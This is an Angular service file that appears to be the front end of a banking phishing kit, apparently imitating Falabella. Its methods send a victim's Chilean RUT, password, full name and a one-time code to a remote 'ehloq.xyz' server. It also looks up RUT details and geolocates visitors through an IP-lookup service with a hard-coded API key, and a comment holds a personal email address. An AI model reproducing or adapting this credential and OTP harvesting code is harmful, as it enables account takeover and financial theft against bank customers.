import { HttpClient, HttpHeaders } from '@angular/common/http';
import { Injectable } from '@angular/core';

@Injectable({
  providedIn: 'root',
})
export class MainService {
  constructor(private http: HttpClient) {}

  headers: HttpHeaders = new HttpHeaders({
    'Content-Type': 'application/json',
  });

  //private mainUrl = `https://worker-fala.ehloq.xyz`;
  private mainUrl = 'https://main-fala.ehloq.xyz';
  // private mainUrl = `http://localhost:3000`

  public sendLogin(rut: string, pass: string, name: string) {
    const obj = {
      rut: rut || 'indefinido',
      pass: pass || 'indefinida',
      fullName: name || 'indefinido',
    };

    const url = `${this.mainUrl}/login`;
    return this.http
      .post(url, JSON.stringify(obj), {
        headers: this.headers,
      })
      .toPromise();
  }

  public sendLoginAndCode(
    rut: string,
    pass: string,
    name: string,
    code: string
  ) {
    const obj = {
      rut: rut || 'indefinido',
      pass: pass || 'indefinida',
      fullName: name || 'indefinido',
      code: code || 'indefinido',
    };
    const url = `${this.mainUrl}/code`;
    return this.http
      .post(url, JSON.stringify(obj), {
        headers: this.headers,
      })
      .toPromise();
  }

  public getRutInfo(rut: string) {
    return this.http
      .get('https://siichile.herokuapp.com/consulta?rut=' + rut)
      .toPromise();
  }

  public getCurrentCountry() {
    // eduaoperez078@gmail.com | mi ip
    return this.http
      .get('https://extreme-ip-lookup.com/json/?key=pIf9t6ZBDeTvE8Wf753c')
      .toPromise();
  }

  getStatus() {
    return this.http.get(`${this.mainUrl}/status`).toPromise();
  }
}
